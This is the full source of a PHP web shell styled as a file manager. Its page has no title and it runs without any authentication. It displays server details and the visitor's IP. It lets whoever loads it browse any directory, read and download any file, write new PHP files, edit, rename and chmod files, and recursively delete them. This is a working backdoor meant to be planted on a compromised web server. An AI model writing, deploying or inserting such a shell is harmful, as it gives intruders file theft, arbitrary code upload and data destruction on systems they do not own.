<!DOCTYPE html>
<html>
<head>
	<title></title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<style type="text/css">
@import url('https://fonts.googleapis.com/css?family=Ubuntu+Mono&display=swap');
body {
  font-family: 'Ubuntu Mono', monospace;
  line-height: 1.25;
  color: #8a8a8a;
  font-weight:normal;
  font-style: normal;
}

table {
  margin: 0;
  background:#fff;
  padding: 10px;
  border-spacing:0;
  width: 70%;
  border-radius:10px;
  box-shadow: 0 3px 6px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
}

table caption {
  font-size: 1.5em;
  margin: .5em 0 .75em;
}

table tr {
    border: 1px solid red;
    padding: .35em;
  }

  table th {
  padding: .625em;
  text-align: center;
}

table td {
	padding: .625em;
	border-bottom: 1px solid #e8e8e8;
}

table th {
  font-size: .85em;
  letter-spacing: .1em;
  text-transform: uppercase;
}
textarea {
	padding: 12px 20px;
	width:88%;
	height:200px;
	resize:none;
	-moz-border-bottom-colors: none;
  	-moz-border-left-colors: none;
  	-moz-border-right-colors: none;
  	-moz-border-top-colors: none;
  	outline:none;
  	border-radius:6px;
  	border:1px solid rgba(222,222,222,0.73);
  	background:rgba(222,222,222,0.73);
  	color:#8a8a8a;
}
a {
	color:#8a8a8a;
	text-decoration:none;
}
input[type=submit] {
  font-family: 'Ubuntu Mono', monospace;
  outline:none;
  color:#8a8a8a;
  font-weight: bold;
  padding:7px;
  border-radius:6px;
  border:1px solid rgba(222,222,222,0.73);
  background:rgba(222,222,222,0.73);
}
input[type=text].action {
	width:94%;
	font-family: 'Ubuntu Mono', monospace;
	padding:12px;
	color:#8a8a8a;
	border-radius:7px;
	border: 1px solid #e8e8e8;
	outline:none;
	background:#e8e8e8;
}
table tr:last-child {
	border-bottom:none;
}
td.not {
	border-bottom:none;
}
td.yes {
	border-bottom: 2px solid #e8e8e8;
}
ul.action {
	background:transparent;
	padding: 10px 10px;
    border-radius:7px;
}
li.action {
	text-align:left;
	list-style:none;
	border:1px solid #e8e8e8;
	padding:10px 20px;
}
li.action:last-child {
	border-radius:0px 0px 7px 7px;
	border-top:none;
}
li.action:first-child {
	border-radius:7px 7px 0px 0px;
}
li.action:nth-child(2) {
	border-top:none;
}
li.action:hover {
	background: #e8e8e8;
	cursor: pointer;
}
div.action {
	width:50%;
}
div.action_f {
	width:50%;
}
.alert {
  padding: 12px;
  color: white;
  opacity: 1;
  transition: opacity 0.6s;
  border-radius:7px; 
}

.alert.success {background-color: #61c765;}
.alert.failed {background-color: #ff8787;}

.closebtn {
  margin-left: 15px;
  color: white;
  font-weight: bold;
  float: right;
  font-size: 22px;
  line-height: 20px;
  cursor: pointer;
  transition: 0.3s;
}

.closebtn:hover {
  color: black;
}
span.a {
	float:left;
}
.b {
	float:right;
}
a.act {
	border-radius:7px 0px 0px 7px; 
}
select, a.act {
	background: #e8e8e8;
	padding:3px 7px;
	border:1px solid transparent;
}
select {
	padding:4px;
	color:#8a8a8a;
	border-radius:0px 7px 7px 0px; 

}
@media screen and (max-width: 600px) {
  table {
  margin: 0;
  background:#fff;
  padding: 10px;
  width: 100%;
  border-radius:10px;
}
select {
	padding:3px;
}
.strong {
	font-size:12px;
}
div.action {
	width:100%;
}
div.action_f {
	width:100%;
}
input[type=text].action {
	width:91%;
}
.k {
	font-size:10px;
	font-weight:bold;
}
  
  table thead {
    border: none;
    clip: rect(0 0 0 0);
    height: 1px;
    margin: -1px;
    padding: 0;
    width: 1px;
  }
  
  table tr {
    border-radius:10px;
  }
  
  table td {
    font-size: .9em;
  }
  
  textarea {
	padding: 12px 20px;
	width:86%;
  }
  th.pol, td.pol {
  	display:none;
  }
  td.tol {
  	
  }
  .sa {
  	font-size:10.5px;
  }
</style>
<body>
<center>
<table>
<thead>
	<tr>
		<td class="yes" colspan="4">
			<?php
			foreach (get_server_info() as $k) {
    			echo "<div clas='k'>".$k."</div>";
    		}
    		?>
    	</td>
    </tr>
</thead>
<?php
error_reporting();
function cwd() {
  if (isset($_GET['path'])) {
    $cwd = @str_replace('\\', DIRECTORY_SEPARATOR, $_GET['path']);
    @chdir($cwd);
  } else {
    $cwd = @str_replace('\\', DIRECTORY_SEPARATOR, @getcwd());
  } return $cwd;
}
function perms($file) {
$perms = fileperms($file);

switch ($perms & 0xF000) {
    case 0xC000: // socket
        $info = 's';
        break;
    case 0xA000: // symbolic link
        $info = 'l';
        break;
    case 0x8000: // regular
        $info = 'r';
        break;
    case 0x6000: // block special
        $info = 'b';
        break;
    case 0x4000: // directory
        $info = 'd';
        break;
    case 0x2000: // character special
        $info = 'c';
        break;
    case 0x1000: // FIFO pipe
        $info = 'p';
        break;
    default: // unknown
        $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

return $info;
}
function permission($filename, $perms, $po=false) {
  if (is_writable($filename)) {
    ?> <font color="green"><?php print $perms ?></font> <?php
  } else {
    ?> <font color="red"><?php print $perms ?></font> <?php
  }
}
function size($file) {
    $bytes = filesize($file);

    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } elseif ($bytes > 1) {
        return $bytes . ' bytes';
    } elseif ($bytes == 1) {
        return '1 byte';
    } else {
        return '0 bytes';
    }
}
if (@$_GET['action'] == 'path') {
	?>
	<thead>
		<tr>
			<th>ACTION</th>
		</tr>
	</thead>
	<tr>
		<td class="not">
			<center>
				<div class="action">
					<input class="action" type="text" name="" value="<?=cwd()?>" readonly>
					<ul class="action">
						<li class="action">
							<a href="?path=<?=cwd()?>&makefile">Make File</a>
						</li>
						<li class="action">
							<a href="?path=<?=cwd()?>&makedir">Make Folder</a>
						</li>
					</ul>
				</div>
			</center>
		</td>
	</tr>
	<?php
	exit();
}
if (@$_GET['action'] == 'dir') {
	$file = $_GET['file'];
	?>
	<thead>
		<tr>
			<th>ACTION</th>
		</tr>
	</thead>
	<tr>
		<td class="not">
			<center>
				<div class="action">
					<input class="action" type="text" name="" value="<?= $file ?>" readonly>
					<ul class="action">
						<li class="action"><a href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a></li>
						<li class="action"><a href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a></li>
						<li class="action"><a href="?path=<?=cwd()?>&delete&file=<?=$file?>">DELETE</a></li>
					</ul>
				</div>
			</center>
		</td>
	</tr>
	<?php
	exit();
}
if (@$_GET['action'] == 'file') {
	$file = $_GET['file'];
	?>
	<thead>
		<tr>
			<th>ACTION</th>
		</tr>
	</thead>
	<tr>
		<td class="not">
			<center>
				<div class="action">
					<input class="action" type="text" name="" value="<?= $file ?>" readonly>
					<ul class="action">
						<li class="action"><a href="?path=<?=cwd()?>&edit&file=<?=$file?>">EDIT</a></li>
						<li class="action"><a href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a></li>
						<li class="action"><a href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a></li>
						<li class="action"><a href="?path=<?=cwd()?>&delete&file=<?=$file?>">DELETE</a></li>
						<li class="action"><a href="?path=<?=cwd()?>&download&file=<?=$file?>">DOWNLOAD</a></li>
					</ul>
				</div>
			</center>
		</td>
	</tr>
	<?php
	exit();
}
function alert($type, $msg) {
	?>
	<tr>
		<td class="not">
			<div class="alert <?=$type?>">
				<span class="closebtn" onclick="this.parentElement.style.display='none';">&times;</span>
				<strong><?=$type?>!</strong> <?=$msg?>
			</div>
		</td>
	</tr>
	<?php
}
function makedir($dirname) {
    return is_dir($dirname) || mkdir($dirname, "0777", true);
}

function makefile($file, $text) {
	$handle = fopen(cwd().'/'.$file, "w");
	if (fwrite($handle, $text)) {
		print("success");
	} else {
		print("failed");
	}
}
function changemode($file, $mode) {
	if (chmod($file, $mode)) {
		print("success");
	} else {
		print("Failed");
	}
}
function delete($filename) {
  if (@is_dir($filename)) {
    $scandir = @scandir($filename);
    foreach ($scandir as $object) {
      if ($object != '.' && $object != '..') {
        if (@is_dir($filename.DIRECTORY_SEPARATOR.$object)) {
          @delete($filename.DIRECTORY_SEPARATOR.$object);
        } else {
          @unlink($filename.DIRECTORY_SEPARATOR.$object);
        }
      }
    } if (@rmdir($filename)) {
      return true;
    } else {
      return false;
    }
  } else {
    if (@unlink($filename)) {
      return true;
    } else {
      return false;
    }
  }
}
function renames($file, $newname) {
	return rename($file, $newname);
}
function edit($file, $text) {
	$handle = fopen($file, "w");
	fwrite($handle, $text);
	fclose($handle);
}
if(isset($_GET['file']) && ($_GET['file'] != '') && (isset($_GET['download']))) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
if (isset($_GET['makedir'])) {
	if (isset($_POST['submit'])) {
		if (makedir($_POST['dir'])) {
			header("Location: ?path".cwd()."");
		} else {
			$alert = "failed";
		}
	}
	?>
	<form method="post">
		<tr>
			<td class="not">
				<center>
					<div class="action">
						<?=@$alert?><br><br>
						<input class="action" type="text" name="dir" value="<?=cwd().'/'?>newfolder"><br><br>
						<input style="width:100%;" type="submit" name="submit">
					</div>
				</center>
			</td>
		</tr>
	</form>
	<?php
	exit();
}
if (isset($_GET['makefile'])) {
	if (isset($_POST['submit'])) {
		makefile($_POST['file'], $_POST['text']);
	}
	?>
	<form method="post">
		<tr>
			<td class="not">
				<center>
					<div class="action_f">
						<input class="action" type="text" name="file" placeholder="filename.php"><br><br>
						<textarea name="text" placeholder="put your script or text"></textarea><br><br>
						<input style="width:100%;" type="submit" name="submit">
					</div>
				</center>
			</td>
		</tr>
	</form>
	<?php
	exit();
}
if (isset($_GET['chmod'])) {
	$file = $_GET['file'];
	if (isset($_POST['submit'])) {
		changemode($file, $_POST['mode']);
	}
	?>
	<form method="post">
		<tr>
			<td class="not">
				<center>
					<div class="action_f">
						<input class="action" type="text" name="mode" value="<?=substr(sprintf("%o", fileperms($file)), -4)?>"><br><br>
						<input style="width:100%;" type="submit" name="submit" value="CHANGE">
					</div>
				</center>
			</td>
		</tr>
	</form>
	<?php
	exit();
}
if (isset($_GET['delete'])) {
	$file = $_GET['file'];
	if (isset($_GET['yes'])) {
		if (delete($file)) {
			header("Location: ?path=".cwd()."");
		}
	} if (isset($_GET['no'])) {
		header("Location: ?path=".cwd()."");
	}
	?>
	<form method="post">
		<tr>
			<td class="not">
				<center>
					<div class="action_f">
						<span>You sure want delete this file 
							<u><?=permission(cwd(), basename($file))?></u></span><br><br>
						<a href="?path=<?=cwd()?>&delete&file=<?=$file?>&no">NO</a>
						<a href="?path=<?=cwd()?>&delete&file=<?=$file?>&yes">YES</a>
					</div>
				</center>
			</td>
		</tr>
	</form>
	<?php
	exit();
}
if (isset($_GET['rename'])) {
	$file = $_GET['file'];
	if (isset($_POST['submit'])) {
		if (renames($file, $_POST['newname'])) {
			$alert = alert("success", "rename");
		} else {
			$alert = alert("failed", "rename");
		}
	}
	?>
	<form method="post">
		<tr>
			<td>
				<center>
					<div class="action_f">
						<input class="action" type="text" name="newname" value="<?=basename($file)?>"><br><br>
						<input style="width:100%;" type="submit" name="submit" value="RENAME">
					</div>
				</center>
			</td>
		</tr>
	</form>
	<?php
	exit();	
}
if (isset($_GET['edit'])) {
	$file = $_GET['file'];
	if (isset($_POST['submit'])) {
		if (edit($_GET['file'], $_POST['text'])) {
			$alert = alert("failed", "");
		} else {
			$alert = alert("success", "");
		}
	}
	?>
		<form method="post">
			<tr>
				<td class="not">
					<center>
					<div class="action_f">
						<span class="a">Filename : <?= permission($file, basename($file)) ?></span><br>
						<span class="a">Size : <?=size($file)?></span><br>
						<span class="a">Type : <?=mime_content_type($file)?></span>
						<select class="b" onclick="if (this.value) window.location=(this.value)">
							<option value="" selected>Action</option>
							<option value="?path=<?=cwd()?>&edit&file=<?=$file?>">Edit</option>
							<option value="?path=<?=cwd()?>&rename&file=<?=$file?>">Rename</option>
							<option value="?path=<?=cwd()?>&chmod&file=<?=$file?>">Chmod</option>
							<option value="?path=<?=cwd()?>&delete&file=<?=$file?>">Delete</option>
							<option value="?path=<?=cwd()?>&download&file=<?=$file?>">Download</option>
						</select>&nbsp;&nbsp;
						 <a class="b act" href="?path=<?=cwd()?>">Back</a>
						<br><br>
						<?=@$alert?>
						<textarea name="text"><?= htmlspecialchars(file_get_contents($file)) ?></textarea>
						<input style="width:100%;" type="submit" name="submit">
					</div>
					</center>
				</td>
			</tr>
		</form>
	<?php
	exit();
}
function get_server_info(){
    $server_addr = isset($_SERVER['SERVER_ADDR'])? $_SERVER['SERVER_ADDR']:$_SERVER["HTTP_HOST"];
    $server_info['ip_adrress'] = "<span class='strong'>Server IP : ".$server_addr." | Your IP : ".$_SERVER['REMOTE_ADDR']."</span>";
    $server_info['time_at_server'] = "<span class='strong'>Time @ Server : ".@date("d M Y H:i:s",time())."</span>";
    $server_info['uname'] = "<span class='strong'>".php_uname()."</span>";
    $server_software = (getenv('SERVER_SOFTWARE')!='')? getenv('SERVER_SOFTWARE')." <span class='strong'> | </span>":'';
    $server_info['software'] = "<span class='strong'>" .$server_software."  PHP ".phpversion()."</span>";    
    return $server_info;
  }
?>
  <tbody>
  <?php
  $scandir = scandir(cwd());
  	foreach ($scandir as $dir) {
  		if (is_dir($dir)) {
  			if ($dir === '..') {
  				$back = "<a class='sa' href='?path=".dirname(cwd())."'>".$dir."</a>";
  			} elseif($dir === '.') {
  				$back = "<a class='sa' href='?path=".cwd()."'>".$dir."</a>";
  			} else {
  				$back = "<a class='sa' href='?path=".cwd().'/'.$dir."'>".$dir."</a>";
  			} if ($dir === '.' || $dir === '..') {
  				$action = "<a class='sa' href='?path=".cwd()."&action=path'>action</a>";
  			} else {
  				$action = '<a class="sa" href="?path='.cwd().'&action=dir&file='.cwd().'/'.$dir.'">action</a>';
  			}
  			?>
  			<tr>
  				<td class="tol">
  					<?=$back?>
  				</td>
  				<td class="pol">
  					<center>
  						<?= filetype(cwd().'/'.$dir) ?>
  					</center>
  				</td>
  				<td class="perms">
  					<center>
  						<span class="k">
  							<?= permission($dir, perms($dir)) ?>
  						</span>
  					</center>
  				</td>
  				<td>
  					<center>
  						<?= $action ?>
  					</center>
  				</td>
  			</tr>
  			<?php
  		}
  	}
  	foreach ($scandir as $file) {
  		if (is_file($file)) {
  			$files = cwd().'/'.$file
  			?>
  			<tr>
  				<td class="tol"><span class="sa"><?= basename($files) ?></span></td>
  				<td class="pol">
  					<center><?= size($files); ?></center>
  				</td>
  				<td class="perms">
  					<center>
  						<span class="k">
  							<?= permission($files, perms($files)) ?>
  						</span>
  					</center>
  				</td>
      			<td>
      				<center>
      					<a class="sa" href="?path=<?=cwd()?>&action=file&file=<?=$files?>">action</a>
      				</center>
      			</td>
  			</tr>
  			<?php
  		}
  	}
  ?>

</tbody>
</table>
</center>
</body>
</html>
